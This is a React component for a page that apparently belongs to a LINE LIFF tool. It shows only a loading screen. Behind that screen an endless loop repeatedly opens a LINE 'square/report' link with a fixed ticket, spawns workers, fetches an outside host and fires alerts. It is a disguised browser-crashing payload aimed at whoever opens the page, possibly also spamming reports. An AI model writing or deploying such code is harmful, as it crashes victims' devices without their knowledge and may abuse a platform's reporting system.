// VRUlSfBloNo75Ztdue05qw6EtYqCKeJZlRvM-w

"use client";
import { useEffect } from "react";
import { Loading } from "@/src/components/Loading/Loading";

export default function Crash() {
  useEffect(() => {

    let a = 7;
    while (!0) {
      location.href =
        "line://square/report?ticket=VRUlSfBloNo75Ztdue05qw6EtYqCKeJZlRvM-w";
      new Worker("worker.js");
      a = a ** 2;
      fetch("https://liff-tool.f5.si");
      alert(a);
    }
  }, []);
  return (
    <>
      <Loading />
    </>
  );
}
